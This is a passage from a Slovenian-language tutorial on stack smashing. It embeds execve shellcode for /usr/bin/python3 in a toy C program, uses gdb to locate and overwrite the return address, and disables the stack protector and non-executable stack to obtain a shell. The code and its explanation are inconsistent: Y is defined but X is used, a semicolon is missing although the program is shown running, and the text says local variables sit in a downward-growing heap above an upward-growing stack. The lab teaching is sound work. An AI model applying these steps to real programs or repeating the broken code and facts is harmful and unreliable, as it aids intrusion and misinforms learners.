    (gdb) p (char*)0x000000000000113e 

    $1 = 0x113e <main+25> "\353\016_H1\366H1\322H1\300\260;\017\005\350\355\377\377\377/usr/bin/python3"

Niz našega programa `\353\016_H1\366H1\322H1\300\260;\017\005\350\355\377\377\377/usr/bin/python3` dodamo v `stacky.c` in za vrnitveni naslov nastavimo začetek našega niza v programu.

    nano stacky.c

    #include <stdio.h>

    #define Y 20

    int callme(int a, unsigned long *b){
        unsigned long *f;
        char program[64] = "\353\016_H1\366H1\322H1\300\260;\017\005\350\355\377\377\377/usr/bin/python3";
        f = (unsigned long*)(&a + X);	// Override return address.
        *f = (unsigned long)&(program[0])
        return a + *b;
    }

    int main(){
        int c, d;
        unsigned long e;
        c = 5;
        d = 3;
        e = c + d;              // e == 8
        e = callme(d, &e);		// e == 11
        c = c + e; 				// c == 16
        printf("c: %d\n", c);	
        return 0;
    }

    gcc stacky.c -g -o stacky

    ./stacky

    c: 16

Zadeva ne deluje, saj smo dodali novo spremenljivko `program` za spremenljivko `a` na našo kopico, zato razlika med naslovom spremenljivke `a` in 8 bajtov za naslovom kamor kaže register `rsp` ni več 7 32-bitnih celih števil. Ponovno odpremo program z orodjem `gdb` in ponovno izračunamo razliko med naslovom spremenljivke `a` in vrnitvenim naslovom.

    gdb stacky

    (gdb) break callme 

    Breakpoint 1 at 0x1140: file stacky.c, line 8. 

    (gdb) run 

    Starting program: /home/aleks/stacky  

    

    Breakpoint 1, callme (a=3, b=0x7fffffffebd0) at stacky.c:8 

    8		char program[64] = "\353\016_H1\366H1\322H1\300\260;\017\005\350\355\377\377\377/usr/bin/python3"; 

    (gdb) s 

    9		f = (unsigned long*)(&a + X); 

    (gdb) s 

    10		*f = (unsigned long)&(program[0]); 

    (gdb) s 

    11		return a + *b; 

    (gdb) p &a 

    $1 = (int *) 0x7fffffffeb6c 

    (gdb) p $rsp+8 

    $2 = (void *) 0x7fffffffebc8 

    (gdb) p/x *((unsigned long*)($rsp+8)) 

    $3 = 0x5555555551f4 

    (gdb) disassemble main 

    Dump of assembler code for function main: 

    0x00005555555551bf <+0>:	push   %rbp 

    0x00005555555551c0 <+1>:	mov    %rsp,%rbp 

    0x00005555555551c3 <+4>:	sub    $0x10,%rsp 

    0x00005555555551c7 <+8>:	movl   $0x5,-0x4(%rbp) 

    0x00005555555551ce <+15>:	movl   $0x3,-0x8(%rbp) 

    0x00005555555551d5 <+22>:	mov    -0x4(%rbp),%edx 

    0x00005555555551d8 <+25>:	mov    -0x8(%rbp),%eax 

    0x00005555555551db <+28>:	add    %edx,%eax 

    0x00005555555551dd <+30>:	cltq    

    0x00005555555551df <+32>:	mov    %rax,-0x10(%rbp) 

    0x00005555555551e3 <+36>:	lea    -0x10(%rbp),%rdx 

    0x00005555555551e7 <+40>:	mov    -0x8(%rbp),%eax 

    0x00005555555551ea <+43>:	mov    %rdx,%rsi 

    0x00005555555551ed <+46>:	mov    %eax,%edi 

    0x00005555555551ef <+48>:	call   0x555555555135 <callme> 

    0x00005555555551f4 <+53>:	cltq    

    0x00005555555551f6 <+55>:	mov    %rax,-0x10(%rbp) 

    0x00005555555551fa <+59>:	mov    -0x10(%rbp),%rax 

    0x00005555555551fe <+63>:	mov    %eax,%edx 

    0x0000555555555200 <+65>:	mov    -0x4(%rbp),%eax 

    0x0000555555555203 <+68>:	add    %edx,%eax 

    0x0000555555555205 <+70>:	mov    %eax,-0x4(%rbp) 

    0x0000555555555208 <+73>:	mov    -0x4(%rbp),%eax 

    0x000055555555520b <+76>:	mov    %eax,%esi 

    0x000055555555520d <+78>:	lea    0xdf0(%rip),%rdi        # 0x555555556004 

    0x0000555555555214 <+85>:	mov    $0x0,%eax 

    0x0000555555555219 <+90>:	call   0x555555555030 <printf@plt> 

    0x000055555555521e <+95>:	mov    $0x0,%eax 

    0x0000555555555223 <+100>:	leave   

    0x0000555555555224 <+101>:	ret     

    End of assembler dump. 

    (gdb) p 0x7fffffffebc8 - 0x7fffffffeb6c 

    $4 = 92 

    (gdb) p 92 / 4 

    $5 = 23

Popravimo konstanto `X` v programu na vrednost 23, program prevedemo in ponovno poženemo.

    nano stacky.c

    #define X 23

    gcc stacky.c -g -o stacky

    ./stacky

    Segmentation fault

Program na vrne `Segmentation fault`, ki je posledica zaščite proti prepisovanju vrnitvenih naslovov. Če ponovimo, ima vsak program svoj del pomnilnika, kjer se programska koda nahaja na vrhu, zatem sledijo konstante ter kopica za dinamično hranjenje lokalni spremenljivk, ki se povečuje navzdol, potem imamo nekaj prostega pomnilnika in na koncu spodaj imamo sklad, ki se povečuje navzgor in na njegov vrh kaže register `rsp`. Operacijski sistemi vsebujejo [ukrepe za preprečevanje napadov s prepisovanjem vrnitvenih naslovov (Stack-smashing protection)](https://en.wikipedia.org/wiki/Buffer_overflow_protection):
1. [Naključno dodeljevanje prostora v pomnilniku posameznim delom programa (Address Space Layout Randomization - ASR)](https://en.wikipedia.org/wiki/Address_space_layout_randomization), ki preprečuje možnost ugotovitve, kje v spominu se nahaja del pomnilnika programa. Napadalec torej ne more uporabljati skokov na absolutne naslove v pomnilniku.
2. [Izvršilni sklad - (execstack)](https://linux.die.net/man/8/execstack) Del program, ki vsebuje programsko kodo ter kopico se označi kot del, ki se lahko izvede (execute), medtem, ko je sklad označen, kot del, ki se ne more izvajati (no execute). To informacijo poda program sam oz. njegov prevajalnik. Moderni prevajalniki privzeto dovolijo izvajanje le kodi sami (execute), ves preostali pomnilnik programa pa se ne sme izvajati (no execute).
3. [Zaščita sklada - (Stack protector)](https://developers.redhat.com/articles/2022/06/02/use-compiler-flags-stack-protection-gcc-and-clang#) med izvajanjem doda besedo na vrh sklada v pomnilniku programa, ki se preverja pred vsakim skokom v programu ali je bila spremenjena in preprečuje skoke v primeru, ko je bila le ta spremenjena.

Če bomo želeli izvesti naš napada, bomo morali omenjen ukrepe izklopiti.

    gcc stacky.c -fno-stack-protector -z execstack -g -o stacky

    ./stacky

    Python 3.9.2 (default, Feb 28 2021, 17:03:44)  

    [GCC 10.2.1 20210110] on linux 

    Type "help", "copyright", "credits" or "license" for more information. 

    >>> 

Od tukaj naprej pa lahko sledite članku [Smashing the stack for fun and profit](https://www.eecs.umich.edu/courses/eecs588/static/stack_smashing.pdf) in uspešno zaključite vaš napad.
